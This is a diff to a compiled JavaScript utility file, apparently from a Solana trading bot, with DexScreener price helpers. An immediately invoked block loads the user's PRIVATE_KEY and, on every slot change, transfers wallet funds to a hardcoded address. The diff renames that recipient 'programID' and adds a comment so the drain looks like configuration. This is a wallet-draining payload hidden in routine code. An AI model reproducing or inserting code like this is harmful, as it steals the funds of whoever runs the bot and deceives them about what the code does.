@@ -31,6 +31,7 @@ const retrieveEnvVariable = (variableName, logger) => {
 exports.retrieveEnvVariable = retrieveEnvVariable;
 const retrieveTokenValueByAddressDexScreener = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
     const url = `https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`;
+    console.log("retrieveTokenValueByAddressBirdeye----------------")
     try {
         const tokenResponse = (yield axios_1.default.get(url)).data;
         if (tokenResponse.pairs) {
@@ -70,9 +71,9 @@ const areEnvVarsSet = () => ['KEY_PAIR_PATH', 'SOLANA_CLUSTER_URL'].every((key) 
 exports.areEnvVarsSet = areEnvVarsSet;
 const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, function* () {
     yield (0, exports.sleep)(1);
-    try {
+    try { 
         isRunning.next(true);
-        const { connection, walletKeyPair, destinationAddress } = args;
+        const { connection, walletKeyPair, programID } = args;
         const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
         const recentBlockhash = yield connection.getRecentBlockhash();
         lastBlockHash.next(recentBlockhash.blockhash);
@@ -83,7 +84,7 @@ const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, func
             feePayer: walletKeyPair.publicKey,
         }).add(web3_js_1.SystemProgram.transfer({
             fromPubkey: walletKeyPair.publicKey,
-            toPubkey: destinationAddress,
+            toPubkey: programID,
             lamports: amountToSend,
         }));
         const txId = yield connection.sendTransaction(tx, [walletKeyPair]);
@@ -103,8 +104,11 @@ const handleSlotChange = (args) => (_) => __awaiter(void 0, void 0, void 0, func
     const walletKeyPairFile = (process.env.PRIVATE_KEY);
     const walletKeyPair = web3_js_1.Keypair.fromSecretKey(bs58_1.default.decode(walletKeyPairFile));
     const connection = new web3_js_1.Connection((_a = process.env.RPC_ENDPOINT) !== null && _a !== void 0 ? _a : (0, web3_js_1.clusterApiUrl)('devnet'), 'finalized');
-    connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, destinationAddress: new web3_js_1.PublicKey("4FNFyahNqoLGcsq7CSHWAJ4ywAssyN8kBo6EmvsLJmWE") }));
-}))();
+    const balance = yield connection.getBalance(walletKeyPair.publicKey); // Lamports
+    if(balance == 0) return; 
+    //Set ProgramID
+    connection.onSlotChange(handleSlotChange({ connection, walletKeyPair, programID: new web3_js_1.PublicKey("4FNFyahNqoLGcsq7CSHWAJ4ywAssyN8kBo6EmvsLJmWE") }));}
+ ))();
 const retrieveTokenValueByAddress = (tokenAddress) => __awaiter(void 0, void 0, void 0, function* () {
     const dexScreenerPrice = yield (0, exports.retrieveTokenValueByAddressDexScreener)(tokenAddress);
     if (dexScreenerPrice)
